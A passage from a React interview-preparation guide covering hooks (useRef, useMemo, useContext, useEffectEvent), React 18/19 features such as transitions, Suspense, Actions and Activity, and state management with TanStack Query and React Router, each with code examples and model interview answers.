**Common mistake → fix:** reading or writing `ref.current` during render (e.g. `return <p>{countRef.current}</p>`). The screen won't update when it changes, because changing a ref doesn't re-render. If it's displayed, it should be state.

**Interview answer:** "useRef is a mutable container that persists across renders without triggering them. I use it for DOM access — focus, scroll, measurements — and for values the UI doesn't display, like timer IDs or the previous value of a prop. Anything rendered on screen belongs in state."

**Follow-ups:**
- *React 19 change?* Function components can now receive `ref` as a normal prop, so `forwardRef` is no longer needed for new code.

---

### Q15. `useMemo`, `useCallback`, `React.memo`

**Short answer:** These are **performance tools**, not correctness tools.
- `useMemo(() => compute(), [deps])` remembers a **calculated value** and recalculates only when the deps change.
- `useCallback(fn, [deps])` remembers a **function**, so it's the same function object between renders.
- `React.memo(Component)` makes a component **skip re-rendering** when its props are the same as last time.
They work together: `memo` only helps if the props you pass keep the same identity, which is what `useMemo`/`useCallback` give you.

**How it works:** In JavaScript, `{}` !== `{}` and `() => {}` !== `() => {}`. Every render creates new objects and functions. `React.memo` compares each prop with `Object.is`, so a new object or function looks like a "changed" prop, even if its contents are identical.

**Example:**
```jsx
const DocTable = React.memo(function DocTable({ rows, onOpen }) {
  console.log("DocTable render");          // expensive: renders 2,000 rows
  return rows.map(r => <Row key={r.id} row={r} onOpen={onOpen} />);
});

function Page({ docs }) {
  const [search, setSearch] = useState("");
  const [theme, setTheme] = useState("dark");

  const rows = useMemo(
    () => docs.filter(d => d.title.includes(search)),     // recalculated only when docs/search change
    [docs, search]
  );
  const onOpen = useCallback(id => navigate(`/docs/${id}`), []);   // same function every render

  return (
    <>
      <ThemeToggle value={theme} onChange={setTheme} />
      <DocTable rows={rows} onOpen={onOpen} />
    </>
  );
}
```

**What happens when the user toggles the theme:**
1. `Page` re-renders because `theme` changed.
2. `rows`: `docs` and `search` are unchanged, so `useMemo` returns the **same array** as last time.
3. `onOpen`: `useCallback` returns the **same function**.
4. `React.memo` compares `rows` and `onOpen` → both identical → **DocTable doesn't re-render**. No "DocTable render" log.
5. Without `useMemo`/`useCallback`, both props would be new objects, memo's comparison would fail, and all 2,000 rows would re-render on every theme toggle.

**Common mistake → fix:** memoising everything "just in case". Each `useMemo` costs memory and a dependency check; for cheap calculations it's slower than recomputing. Measure first (React DevTools Profiler), then memoise the expensive parts. The **React Compiler** (1.0, stable) can add this memoisation automatically at build time.

**Interview answer:** "useMemo caches a computed value, useCallback caches a function's identity, and React.memo skips re-rendering a component when its props are unchanged by reference. They only pay off together and for expensive work, so I profile first. With the React Compiler enabled, most manual memoisation becomes unnecessary."

**Follow-ups:**
- *Does useMemo guarantee the value is kept?* No — React may discard cached values. Treat it as an optimisation, never as a place to store state.

---

### Q16. `useContext` — when to use, when to avoid

**Short answer:** Context lets a parent make a value available to **any component below it** without passing props through every level. Use it for values many components need and that change rarely: signed-in user, theme, locale, feature flags. Avoid it for fast-changing data: **every component that reads the context re-renders whenever its value changes**.

**Example:**
```jsx
const AuthContext = createContext(null);

function App() {
  const [user, setUser] = useState(null);
  const value = useMemo(() => ({ user, setUser }), [user]);   // same object unless user changes
  return (
    <AuthContext value={value}>        {/* React 19: <Context> can be used directly as the provider */}
      <Layout />
    </AuthContext>
  );
}

function Avatar() {
  const { user } = useContext(AuthContext);   // no props needed
  return <img src={user?.avatarUrl} alt={user?.name ?? "Guest"} />;
}
```

**What happens, step by step:**
1. `App` provides `value` to everything inside it.
2. `Avatar` (any depth below) calls `useContext(AuthContext)` and gets `{ user, setUser }`.
3. When the user logs in, `setUser` changes `user` → `useMemo` creates a new `value` object → React re-renders **every component that reads AuthContext**.

**Common mistake → fix:** creating the value object inline.
```jsx
<AuthContext value={{ user, setUser }}>   // ❌ new object on EVERY App render → all consumers re-render
```
Memoise the value (as above), split rarely-changing and often-changing values into separate contexts, and keep high-frequency data (streamed tokens, mouse position, form fields) out of context — use local state or a store with selectors (Zustand, Redux).

**Interview answer:** "Context avoids prop drilling for app-wide values like auth, theme or locale. The catch is that every consumer re-renders when the provided value changes, so I memoise the value, split contexts by how often they change, and keep fast-changing data in local state or a selector-based store."

**Follow-ups:**
- *Is context a state manager?* No — it only transports a value. The state still lives in a `useState`/`useReducer` somewhere above.

---

### Q17. `useLayoutEffect`, `useId`, `useSyncExternalStore`, `useImperativeHandle`

**Short answer:** Four specialised hooks you use rarely:

| Hook | What it's for | Example |
|---|---|---|
| `useLayoutEffect` | Measure the DOM and fix it **before the browser paints**, so the user never sees a jump | position a tooltip from the button's size |
| `useId` | A unique, stable ID that matches between server and client rendering | link a `<label htmlFor>` to an `<input id>` |
| `useSyncExternalStore` | Subscribe safely to a store outside React | browser online status, a custom store |
| `useImperativeHandle` | Expose a limited set of methods through a ref | a `<VideoPlayer>` exposing only `play()` and `pause()` |

**Timing of `useLayoutEffect` vs `useEffect`:**
```flow
trace: When each effect runs after an update
React commits the DOM changes > The new tooltip element exists but the browser hasn't painted it yet.
**useLayoutEffect** runs: measure the button, set the tooltip position > Painting waits for this code, so the user never sees the tooltip in the wrong place.
browser paints > The user sees the final, correct position.
**useEffect** runs > Normal effects run after paint, so they never delay the screen. Use them by default.
```

**Example:**
```jsx
function Tooltip({ anchorRef, text }) {
  const tipRef = useRef(null);
  const [top, setTop] = useState(0);

  useLayoutEffect(() => {
    const anchor = anchorRef.current.getBoundingClientRect();
    setTop(anchor.top - tipRef.current.offsetHeight - 8);   // place it above the anchor
  }, [text]);

  return <div ref={tipRef} style={{ position: "fixed", top }}>{text}</div>;
}

function EmailField() {
  const id = useId();                 // e.g. ":r3:" — same on server and client
  return <><label htmlFor={id}>Email</label><input id={id} /></>;
}

function useOnlineStatus() {
  return useSyncExternalStore(
    cb => { addEventListener("online", cb); addEventListener("offline", cb);
            return () => { removeEventListener("online", cb); removeEventListener("offline", cb); }; },
    () => navigator.onLine,           // current value on the client
    () => true                        // value during server rendering
  );
}
```

**Common mistake → fix:** using `useLayoutEffect` for everything. It blocks painting, so slow code inside it makes the app feel laggy. Default to `useEffect`; switch only when you see a visual flicker.

**Interview answer:** "useLayoutEffect runs after DOM updates but before paint, so I use it only for measuring and positioning to avoid flicker. useId generates stable IDs that match in server rendering, useSyncExternalStore is the correct way to subscribe to external stores, and useImperativeHandle exposes a small API through a ref."

**Follow-ups:**
- *Why not `Math.random()` for IDs?* The server and client would generate different values, causing hydration mismatches. `useId` is deterministic.

---

### Q18. Stale closures

**Short answer:** A "stale closure" is when a function created during an **old render** keeps using that render's values after state has moved on. It typically happens with `setInterval`, subscriptions or callbacks created once (`useEffect(…, [])`). Fix it by using the **updater form** of setState, by listing the value as a dependency, or by reading the latest value through `useEffectEvent` or a ref.

**How it works:** Each render's functions capture (close over) the props and state of that render — like a photo. A function created in render 1 sees render 1's `count` forever, even after render 5.

**Example:**
```jsx
function Ticker() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      setCount(count + 1);         // ❌ always 0 + 1
    }, 1000);
    return () => clearInterval(id);
  }, []);                          // effect created once, in render 1

  return <p>{count}</p>;
}
```

```flow
trace: Why the counter gets stuck at 1
render 1: count = 0, the effect creates the interval callback > The callback closes over count = 0. Because the deps are [], it is never re-created.
after 1 s: callback runs setCount(**0** + 1) > count becomes 1 and the component re-renders.
render 2: count = 1, but the interval still holds render 1's callback > The effect didn't re-run, so nobody replaced the callback.
after 2 s: callback runs setCount(**0** + 1) again > It still sees 0. The value stays 1 forever.
fix: setCount(c => c + 1) > The updater gets the latest value from React, so the old callback works correctly.
```

**Fixes, in order of preference:**
```jsx
// 1. Updater form — the callback doesn't need to read count at all
setInterval(() => setCount(c => c + 1), 1000);

// 2. Need to READ the latest value without restarting the effect → useEffectEvent (React 19.2)
const onTick = useEffectEvent(() => logToServer(count));   // always sees the latest count
useEffect(() => {
  const id = setInterval(onTick, 1000);
  return () => clearInterval(id);
}, []);                                                     // effect events are not dependencies

// 3. Re-create when the value changes: add it to the deps (restarts the interval each time)
useEffect(() => { … }, [count]);
```

**Interview answer:** "A stale closure is a callback that still sees values from the render it was created in. It's common with intervals and subscriptions set up once. I fix it with the updater form of setState, by adding the value to the dependency array, or — when I just need to read the latest value without re-subscribing — with useEffectEvent or a ref."

**Follow-ups:**
- *Does the lint rule catch this?* Yes, `react-hooks/exhaustive-deps` warns that `count` is missing from the dependencies.

---

### Q19. Custom hooks — design and testing

**Short answer:** A custom hook is a function whose name starts with `use` and that calls other hooks. It lets you **reuse stateful logic** (fetching, subscriptions, form handling) across components. It shares the **logic, not the state**: each component that calls it gets its own independent copy of the state.

**Example:**
```jsx
function useAgentStream(sessionId) {
  const [tokens, setTokens] = useState("");
  const [status, setStatus] = useState("idle");

  useEffect(() => {
    if (!sessionId) return;
    setTokens("");
    setStatus("streaming");
    const source = new EventSource(`/api/sessions/${sessionId}/stream`);
    source.onmessage = e => setTokens(t => t + JSON.parse(e.data).token);
    source.addEventListener("done", () => setStatus("done"));
    source.onerror = () => setStatus("error");
    return () => source.close();
  }, [sessionId]);

  return { tokens, status };
}

function ChatPanel({ sessionId }) {
  const { tokens, status } = useAgentStream(sessionId);
  return <><p>{tokens}</p>{status === "error" && <RetryButton />}</>;
}
```

**What happens, step by step:**
1. `ChatPanel` calls `useAgentStream("s1")`. Inside, `useState` and `useEffect` belong to **ChatPanel** — the hook is just a function running during ChatPanel's render.
2. The effect opens the stream; each message appends a token, which re-renders ChatPanel.
3. A second component calling `useAgentStream("s2")` would get completely separate `tokens` and `status`.

**Design guidelines:**
- Return a small, clear API (`{ tokens, status }`), not internal setters.
- Handle cleanup and errors inside the hook so callers can't forget.
- Accept primitives (IDs) as arguments so dependency arrays stay simple.

**Testing:**
```jsx
import { renderHook, act } from "@testing-library/react";
test("counts up", () => {
  const { result } = renderHook(() => useCounter());
  act(() => result.current.increment());
  expect(result.current.count).toBe(1);
});
```

**Common mistake → fix:** expecting two components to share state through a hook. They won't — each call is independent. To share state, lift it up, use context, or use a store.

**Interview answer:** "Custom hooks extract reusable stateful logic into a `use…` function. Each component that calls it gets its own state; only the logic is shared. I keep the returned API small, handle cleanup inside, and test them with `renderHook`."

**Follow-ups:**
- *Why must the name start with `use`?* So the linter can apply the Rules of Hooks to it, and so readers know it may hold state.

---

## 4. React 18/19 features

### Q20. Concurrent rendering — what changed in React 18?

**Short answer:** Before React 18, once React started rendering it couldn't stop until it finished, so a big render (a 10,000-row list) froze the page. **Concurrent rendering** lets React **pause a low-priority render, handle something urgent (like a keystroke), and then continue or restart**. You opt in per update with `useTransition` / `useDeferredValue`, and you need `createRoot`. React 18 also made **automatic batching** work everywhere.

**How it works:** React gives updates a priority. Typing and clicking are urgent; showing filtered results can wait. While rendering a non-urgent update, React checks every few milliseconds whether something urgent arrived. If so, it puts the unfinished work aside, renders the urgent update, and comes back (throwing away work that's now out of date).

**Example — automatic batching:**
```jsx
// React 17: inside a timeout, each setter caused its own render (2 renders)
// React 18+: both are batched into ONE render, wherever they happen
setTimeout(() => {
  setLoading(false);
  setData(result);
}, 0);
```

**Example — interruptible rendering:**
```jsx
const root = createRoot(document.getElementById("root"));   // required for concurrent features
root.render(<App />);
```
```flow
sequence: A keystroke interrupts a slow list render
actors: User, React, Results list
React -> Results list: start rendering 10,000 filtered rows (marked as a transition)
User -> React: types another letter (urgent)
React -> React: pause the list render and handle the keystroke first
React --> User: the input shows the new letter immediately
React -> Results list: restart the list render with the newest filter
> The old, half-finished render is thrown away because its filter is already out of date. The user never feels the input freeze.
```

**Interview answer:** "React 18 made rendering interruptible. Updates marked as transitions can be paused when something urgent like typing happens, so the UI stays responsive. It requires `createRoot`, and it also brought automatic batching for updates in timeouts and promises, not just event handlers."

**Follow-ups:**
- *Does concurrent rendering make my code run in parallel?* No — JavaScript is still single-threaded. React just splits rendering into small chunks and decides which to do first.
- *Why does render purity matter more now?* Because React may start, pause and discard renders; side effects in render would run for screens the user never sees.

---

### Q21. `useTransition` and `useDeferredValue`

**Short answer:** Both tell React "this update is **not urgent** — keep typing and clicking responsive". `useTransition` is for when **you own the state update**: wrap the setter in `startTransition` and get an `isPending` flag. `useDeferredValue` is for when **you only receive a value** (e.g. a prop): it gives you a copy of the value that lags behind during heavy renders.

**Example — useTransition (you control the update):**
```jsx
function DocSearch({ docs }) {
  const [text, setText] = useState("");
  const [filter, setFilter] = useState("");
  const [isPending, startTransition] = useTransition();

  function handleChange(e) {
    setText(e.target.value);                         // urgent: the input must update now
    startTransition(() => setFilter(e.target.value)); // not urgent: the big list can wait
  }

  return (
    <>
      <input value={text} onChange={handleChange} />
      {isPending && <Spinner />}
      <BigList docs={docs} filter={filter} />
    </>
  );
}
```

**What happens when the user types "vp" quickly:**
1. Keystroke "v": `setText("v")` renders the input immediately. `setFilter("v")` starts a background render of `BigList`.
2. Keystroke "p" arrives while the list is still rendering. React renders the input with "vp" at once.
3. React throws away the unfinished "v" list render and renders the list for "vp" instead.
4. While that's running, `isPending` is `true`, so a small spinner shows. The input never lags.

**Example — useDeferredValue (you only receive the value):**
```jsx
function Results({ query }) {                 // query comes from the parent as a prop
  const deferredQuery = useDeferredValue(query);
  const isStale = query !== deferredQuery;
  return (
    <div style={{ opacity: isStale ? 0.5 : 1 }}>
      <BigList filter={deferredQuery} />       {/* renders with the slightly older value */}
    </div>
  );
}
```

**Common mistake → fix:** wrapping the input's own state in a transition. `startTransition(() => setText(v))` makes the **input** lag. Only the expensive, secondary update goes in the transition.

**Interview answer:** "Both mark work as non-urgent so input stays responsive. With useTransition I wrap the state update myself and get isPending; with useDeferredValue I get a lagging copy of a value I receive. Neither makes slow code faster — they let React prioritise. If the list is huge I'd still virtualise it."

**Follow-ups:**
- *Can transitions be async?* Yes, in React 19 `startTransition` accepts async functions; that's the basis of Actions (Q24).

---

### Q22. Suspense, `React.lazy` and code splitting

**Short answer:** **Code splitting** means not sending all of your app's JavaScript up front. `React.lazy(() => import("./PdfViewer"))` loads a component's code only when it's first rendered. **`<Suspense fallback={…}>`** shows a placeholder (spinner, skeleton) while that code — or data, with a Suspense-enabled library — is still loading.

**Example:**
```jsx
import { lazy, Suspense } from "react";
const PdfViewer = lazy(() => import("./PdfViewer"));    // separate file, loaded on demand

function DocumentPage({ doc }) {
  const [open, setOpen] = useState(false);
  return (
    <>
      <button onClick={() => setOpen(true)}>Preview</button>
      {open && (
        <Suspense fallback={<Spinner label="Loading viewer…" />}>
          <PdfViewer url={doc.url} />
        </Suspense>
      )}
    </>
  );
}
```

**What happens, step by step:**
1. The page loads without the PDF viewer code (it might be 500 KB). The first load is faster.
2. The user clicks Preview. React tries to render `PdfViewer`, but its code isn't loaded, so the lazy component "suspends" (throws a promise internally).
3. The nearest `<Suspense>` catches that and shows the fallback spinner.
4. The browser downloads the viewer's chunk. When it arrives, React renders the real `PdfViewer` in place of the spinner.

**Common mistake → fix:** putting one `<Suspense>` around the whole app. Then any lazy component anywhere replaces the **entire page** with a spinner. Place boundaries close to the parts that load, so the rest of the page stays visible.

**Interview answer:** "React.lazy with dynamic import splits a component into its own chunk that loads on first render. Suspense shows a fallback while it loads. I split heavy, rarely used features like viewers, editors and charts, and place Suspense boundaries close to them so the rest of the page stays interactive."

**Follow-ups:**
- *What if the chunk fails to load (e.g. after a deploy)?* Wrap it in an error boundary with a retry or reload button.

---

### Q23. Error boundaries — what they catch and what they don't

**Short answer:** An error boundary is a component that **catches JavaScript errors thrown while rendering its children**, shows a fallback UI instead of a blank page, and lets you log the error. It catches errors in rendering, lifecycle methods and constructors below it. It does **not** catch errors in event handlers, async code (`setTimeout`, `fetch().then`), server rendering, or in the boundary itself.

**How it works:** Without a boundary, an error during render unmounts the **whole** React tree — the user gets a white screen. A boundary limits the damage to its own subtree.

**Example:**
```jsx
class ErrorBoundary extends React.Component {
  state = { error: null };
  static getDerivedStateFromError(error) { return { error }; }        // switch to fallback
  componentDidCatch(error, info) { logError(error, info.componentStack); } // report it
  render() {
    if (this.state.error) {
      return <div role="alert">Something went wrong. <button onClick={() => this.setState({ error: null })}>Try again</button></div>;
    }
    return this.props.children;
  }
}

<ErrorBoundary>
  <ChatPanel />          {/* if ChatPanel throws while rendering, only this area shows the fallback */}
</ErrorBoundary>
```

**What it does NOT catch — and what to do instead:**
```jsx
async function handleSend() {
  try {
    await api.send(message);          // errors here are NOT caught by the boundary
  } catch (e) {
    setError(e.message);              // ✅ handle it yourself and show it in the UI
  }
}
```

**Interview answer:** "Error boundaries catch render-time errors in their subtree and show a fallback instead of crashing the whole app. They don't catch event-handler or async errors — those I handle with try/catch and state. I place boundaries around independent areas like the chat panel or a widget, and log errors to monitoring from componentDidCatch."

**Follow-ups:**
- *Is there a hook version?* No built-in hook; most teams use the `react-error-boundary` package, which wraps the class for you.

---

### Q24. React 19: Actions, `useActionState`, `useFormStatus`, `useOptimistic`

**Short answer:** React 19 adds built-in handling for the usual "submit → show pending → handle result or error" flow. An **Action** is an async function you run in a transition — for example by passing it to `<form action={…}>`. React then manages the pending state for you.
- **`useActionState`** keeps the result of the last action, plus an `isPending` flag.
- **`useFormStatus`** lets a child of the form (like the submit button) know the form is submitting.
- **`useOptimistic`** shows a temporary "assumed success" value while the action runs.

**Example — sending a chat message:**
```jsx
function SubmitButton() {
  const { pending } = useFormStatus();                 // reads the parent <form>'s status
  return <button disabled={pending}>{pending ? "Sending…" : "Send"}</button>;
}

function Chat({ messages }) {
  const [optimisticMessages, addOptimistic] = useOptimistic(
    messages,
    (current, newText) => [...current, { id: "tmp", text: newText, pending: true }]
  );

  const [error, submitAction] = useActionState(async (previousError, formData) => {
    const text = formData.get("text");
    addOptimistic(text);                 // show it immediately
    try {
      await api.send(text);              // the real request
      return null;                       // no error
    } catch (e) {
      return "Couldn't send. Try again.";
    }
  }, null);

  return (
    <form action={submitAction}>
      <ul>{optimisticMessages.map(m => <li key={m.id} style={{ opacity: m.pending ? 0.5 : 1 }}>{m.text}</li>)}</ul>
      <input name="text" />
      <SubmitButton />
      {error && <p role="alert">{error}</p>}
    </form>
  );
}
```

**What happens, step by step:**
1. The user submits. React runs `submitAction` inside a transition and passes the form's data.
2. `addOptimistic(text)` makes `optimisticMessages` include the new message at once (shown faded).
3. While `api.send` is in flight, `useFormStatus` reports `pending: true`, so the button shows "Sending…" and is disabled.
4. When the action finishes, the optimistic value is dropped and `optimisticMessages` goes back to the real `messages` prop. The parent should have refreshed `messages` to include the saved message.
5. If it failed, the action returns an error string. `useActionState` stores it as `error`, and the message disappears because the optimistic state is discarded.

**Common mistake → fix:** calling `useFormStatus` in the same component that renders the `<form>`. It only reads the status of a **parent** form, so it must be used inside a child component (like `SubmitButton` above).

**Interview answer:** "React 19 Actions let me pass an async function to a form or a transition, and React tracks the pending state. useActionState stores the action's result and gives isPending, useFormStatus lets nested components like the submit button see the pending state, and useOptimistic shows the expected result immediately and rolls back automatically if the action fails."

**Follow-ups:**
- *Do I still need a form library?* For complex validation, often yes. Actions handle submission state; libraries help with field-level validation.

---

### Q25. The `use()` API and Server Components

**Short answer:**
- **`use(promise)`** reads the result of a promise during render. While it's pending, the component suspends and the nearest `<Suspense>` shows its fallback. `use(Context)` reads context. Unlike hooks, `use` can be called inside `if` statements and loops.
- **React Server Components (RSC)** are components that run **only on the server** (with a framework like Next.js). They can read databases directly, and their code never ships to the browser. Interactive parts are marked `"use client"` and run in the browser as usual.

**Example — use(promise):**
```jsx
function OrderPage({ orderId }) {
  const orderPromise = useMemo(() => fetchOrder(orderId), [orderId]);   // or passed down from a server component
  return (
    <Suspense fallback={<Skeleton />}>
      <OrderDetails orderPromise={orderPromise} />
    </Suspense>
  );
}

function OrderDetails({ orderPromise }) {
  const order = use(orderPromise);       // suspends until the promise resolves
  return <h1>Order {order.id}: {order.status}</h1>;
}
```

**What happens:**
1. `OrderDetails` calls `use(orderPromise)`. The promise is pending, so React suspends this component and shows `<Skeleton />`.
2. When the promise resolves, React renders `OrderDetails` again and `use` returns the order object.
3. If the promise rejects, the nearest error boundary handles it.

**Common mistake → fix:** creating the promise inside the component that calls `use` (`use(fetchOrder(id))`). Every render creates a new promise, so it suspends forever. Create the promise once (in a parent, a cache, a loader, or a server component) and pass it down.

**Interview answer:** "use() reads a promise or context during render and integrates with Suspense and error boundaries, and it can be called conditionally. Server Components render on the server, can access data directly, and send no JavaScript for themselves to the browser; I mark interactive components with 'use client'. In a plain Vite SPA I mostly use TanStack Query; RSC needs a framework like Next.js."

**Follow-ups:**
- *Can Server Components use useState?* No — no state, effects or browser APIs. Those belong in client components.

---

### Q26. React 19.2: `<Activity>` and `useEffectEvent`

**Short answer:**
- **`<Activity mode="hidden">`** hides part of the UI **without unmounting it**, so its state (typed draft, scroll position, form values) is kept. While hidden, React cleans up its effects (closing subscriptions) and re-creates them when it's shown again.
- **`useEffectEvent`** creates a function you call from inside an effect that always sees the **latest** props and state, without making the effect re-run when those values change.

**Example — `<Activity>`:**
```jsx
function Tabs({ tab }) {
  return (
    <>
      <Activity mode={tab === "chat" ? "visible" : "hidden"}>
        <ChatPanel />          {/* keeps its draft and scroll position while you visit Settings */}
      </Activity>
      <Activity mode={tab === "settings" ? "visible" : "hidden"}>
        <SettingsPanel />
      </Activity>
    </>
  );
}
```

**What happens when you switch from Chat to Settings and back:**
1. ChatPanel is hidden with `display: none`. Its state stays in memory and its effects are cleaned up (for example, the stream subscription closes).
2. While hidden it can still re-render in the background at low priority, if its props change.
3. Switching back shows it instantly with the same draft and scroll position, and re-creates its effects.
4. With a plain conditional (`tab === "chat" && <ChatPanel />`), ChatPanel would unmount and lose all of that.

**Example — `useEffectEvent`:**
```jsx
function ChatRoom({ roomId, theme }) {
  const onConnected = useEffectEvent(() => {
    showToast("Connected!", theme);      // always uses the latest theme
  });

  useEffect(() => {
    const conn = connect(roomId);
    conn.on("connected", onConnected);
    return () => conn.disconnect();
  }, [roomId]);                          // theme is NOT a dependency; changing theme won't reconnect
}
```
Without `useEffectEvent`, using `theme` inside the effect would force it into the dependency list, so changing the theme would disconnect and reconnect the chat.

**Common mistake → fix:** putting the effect event in the dependency array. Effect events are not reactive and must be left out; including them makes the effect re-run every render.

**Interview answer:** "React 19.2 added `<Activity>`, which hides UI while preserving its state and pausing its effects — useful for tabs and back-navigation. It also added useEffectEvent, which lets an effect call logic that reads the latest props without listing them as dependencies, so a theme change doesn't reconnect a socket."

**Follow-ups:**
- *Activity vs CSS `display:none` myself?* Your own CSS keeps effects running. Activity also cleans them up and lowers the priority of hidden updates.

---

## 5. State management & data fetching

### Q27. How do you organise state in a large app?

**Short answer:** Sort every piece of state by **who owns it and where it comes from**, then use the matching tool. Most "global state" problems disappear once server data, URL state and local UI state are separated.

| Kind of state | Example | Where it lives |
|---|---|---|
| **Server data** | documents, jobs, chat history | TanStack Query (cache, refetch, invalidation) |
| **URL state** | selected document, filters, page number | the router (`useSearchParams`, route params) |
| **Form state** | fields being edited, validation errors | local state or a form library |
| **Local UI state** | is this dropdown open, which tab | `useState` in the component that uses it |
| **Shared client state** | signed-in user, theme, feature flags | context or a small store (Zustand) |

**Example — the same app, organised:**
```jsx
function DocumentsPage() {
  const [params, setParams] = useSearchParams();             // URL: ?status=failed&page=2
  const status = params.get("status") ?? "all";
  const { data, isPending } = useQuery({                     // server data, cached per key
    queryKey: ["documents", status],
    queryFn: () => api.listDocuments(status),
  });
  const [selectedIds, setSelectedIds] = useState([]);        // local UI state
  …
}
```

**Why this works:** putting the filter in the URL means a refresh or a shared link shows the same view. Keeping server data in a query cache means two components asking for the same documents share one request, and the data refreshes itself. Only state that truly has nowhere else to go becomes "global".

**Common mistake → fix:** copying API responses into a global Redux/Zustand store and keeping them in sync by hand. You end up re-implementing caching, loading flags and refetching badly. Use a server-state library for server data.

**Interview answer:** "I classify state first: server data goes in TanStack Query, shareable view state in the URL, form state in the form, UI state locally, and only genuinely shared client state in context or a small store. That keeps a single source of truth for each piece of data and avoids a huge global store."

**Follow-ups:**
- *When would you still use Redux?* Large client-side state with complex cross-cutting updates (an editor, offline-first app), or a team that wants its devtools and conventions.

---

### Q28. Server state with TanStack Query

**Short answer:** TanStack Query fetches, **caches** and **keeps server data fresh** for you. You give each query a **key** (like `["documents", tenantId, page]`) and a fetch function. Components that use the same key share the cached data. It handles loading and error states, retries, background refetching, deduplication, and invalidation after you change data.

**Example:**
```jsx
function DocumentList({ tenantId, page }) {
  const { data, isPending, error } = useQuery({
    queryKey: ["documents", tenantId, page],   // everything that changes the result is in the key
    queryFn: () => api.listDocuments(tenantId, page),
    staleTime: 30_000,                          // treat data as fresh for 30 s
  });

  if (isPending) return <Spinner />;
  if (error) return <ErrorBox error={error} />;
  return <ul>{data.items.map(d => <li key={d.id}>{d.title}</li>)}</ul>;
}

function RenameButton({ doc }) {
  const queryClient = useQueryClient();
  const rename = useMutation({
    mutationFn: newTitle => api.rename(doc.id, newTitle),
    onSuccess: () => queryClient.invalidateQueries({ queryKey: ["documents"] }),  // refetch lists
  });
  return <button onClick={() => rename.mutate("New title")}>Rename</button>;
}
```

```flow
sequence: Stale-while-revalidate in practice
actors: Component, Query cache, API
Component -> Query cache: useQuery(["documents", "t1", 1])
Query cache --> Component: first visit: nothing cached, so isPending is true
Query cache -> API: fetch page 1
API --> Query cache: 20 documents (stored under that key)
Query cache --> Component: render the list
Component -> Query cache: user leaves and comes back 2 minutes later
Query cache --> Component: cached list shown instantly (no spinner)
Query cache -> API: data is older than staleTime, so refetch in the background
API --> Query cache: fresh list replaces the old one and the component re-renders
```

**Common mistake → fix:** leaving something out of the key. If `tenantId` isn't in `queryKey`, switching tenants shows the **previous tenant's cached documents**. Every variable the fetch function uses belongs in the key.

**Interview answer:** "TanStack Query treats server data as a cache keyed by query key. It deduplicates requests, shows cached data instantly while refetching in the background, retries failures, and lets me invalidate keys after mutations. The key rule is that every input to the fetch belongs in the query key."

**Follow-ups:**
- *staleTime vs gcTime?* `staleTime`: how long data counts as fresh (no refetch). `gcTime`: how long unused data stays in memory before it's removed.

---

### Q29. Race conditions in async fetching

**Short answer:** If the user switches from document A to document B, and A's request is slower, A's response can arrive **after** B's and overwrite the screen with the wrong document. Fix it by **cancelling** the outdated request (`AbortController`) or **ignoring** responses that no longer match the current ID. Query libraries do this for you.

**Example — the bug and the fix:**
```jsx
// ❌ race condition
useEffect(() => {
  fetch(`/api/docs/${docId}`).then(r => r.json()).then(setDoc);
}, [docId]);

// ✅ cancel the old request when docId changes
useEffect(() => {
  const controller = new AbortController();
  fetch(`/api/docs/${docId}`, { signal: controller.signal })
    .then(r => r.json())
    .then(setDoc)
    .catch(e => { if (e.name !== "AbortError") setError(e); });
  return () => controller.abort();            // cleanup runs when docId changes
}, [docId]);
```

```flow
sequence: Why the old response can win
actors: Component, Server
Component -> Server: request doc A (slow, 2 s)
Component -> Component: user switches to doc B
Component -> Server: request doc B (fast, 0.3 s)
Server --> Component: B arrives, screen shows B
Server --> Component: A arrives late and overwrites the screen with A
> Without cancellation the user is looking at B's page title but A's content. With AbortController, switching to B runs the cleanup, which aborts request A, so it never reaches setDoc.
```

**Interview answer:** "When requests can overlap, the slower, older one can finish last and overwrite newer data. I cancel superseded requests with AbortController in the effect cleanup, or check that the response still matches the current ID. TanStack Query handles it by keying data per ID, so a late response only updates its own cache entry."

**Follow-ups:**
- *Does aborting stop the server work?* Not necessarily — it stops the browser from waiting. The server may still finish, so write endpoints to be safe to repeat.

---

### Q30. Optimistic updates

**Short answer:** An optimistic update **shows the result of an action immediately**, before the server confirms it, and then either keeps it (success) or rolls it back (failure). It makes apps feel instant. Use it for actions that almost always succeed (likes, renames, sending a message), and always handle the failure case visibly.

**Example — sending a chat message with a temporary ID:**
```jsx
async function send(text) {
  const tempId = `tmp-${crypto.randomUUID()}`;
  setMessages(m => [...m, { id: tempId, text, status: "pending" }]);       // 1. show now

  try {
    const saved = await api.sendMessage(text);                             // 2. real request
    setMessages(m => m.map(x => x.id === tempId ? { ...saved, status: "sent" } : x));   // 3a. swap in real id
  } catch {
    setMessages(m => m.map(x => x.id === tempId ? { ...x, status: "failed" } : x));     // 3b. mark failed
  }
}
```

**What happens, step by step:**
1. The message appears instantly with a temporary ID and a "pending" style (e.g. greyed).
2. The request goes to the server.
3. On success (`201 { id: "m-42" }`), the temporary entry is replaced by the saved one with its real ID, so later edits and deletes use the right ID.
4. On failure, the message stays but is marked "failed" with a **Retry** button — never silently remove what the user typed.

**Common mistake → fix:** using optimistic updates for actions that often fail or are expensive to undo (payments, irreversible deletes). Show a pending state instead. In React 19 you can use `useOptimistic` (Q24); with TanStack Query use `onMutate` + rollback in `onError`.

**Interview answer:** "I update the UI immediately with a temporary entry, send the request, then replace it with the server's version on success or mark it failed with a retry on error. I only do this for actions that rarely fail and are easy to undo."

**Follow-ups:**
- *How do you avoid duplicates if the user retries?* Send an idempotency key with the request so the server stores the message once.

---

### Q31. Routing (React Router) basics

**Short answer:** A router maps the **URL** to which components are shown, without reloading the page. Nested routes share layouts (a sidebar stays while the content changes via `<Outlet />`). Put anything a user might want to bookmark or share — the selected document, filters, the page number — **in the URL**, not in component state.

**Example:**
```jsx
const router = createBrowserRouter([
  {
    path: "/",
    element: <AppLayout />,                  // header + sidebar, renders <Outlet /> for children
    children: [
      { index: true, element: <Home /> },
      { path: "docs", element: <DocList /> },
      { path: "docs/:docId", element: <DocDetail /> },
    ],
  },
]);

function DocDetail() {
  const { docId } = useParams();             // "42" when the URL is /docs/42
  const { data } = useQuery({ queryKey: ["doc", docId], queryFn: () => api.getDoc(docId) });
  return <h1>{data?.title}</h1>;
}
```

**What happens when the user clicks `<Link to="/docs/42">`:**
1. The router updates the browser URL with `history.pushState` — no page reload.
2. It matches `/docs/42` to the `docs/:docId` route.
3. `AppLayout` stays mounted (the sidebar keeps its state); only the `<Outlet />` content swaps to `DocDetail`.
4. `useParams()` returns `{ docId: "42" }`, and the component loads that document.

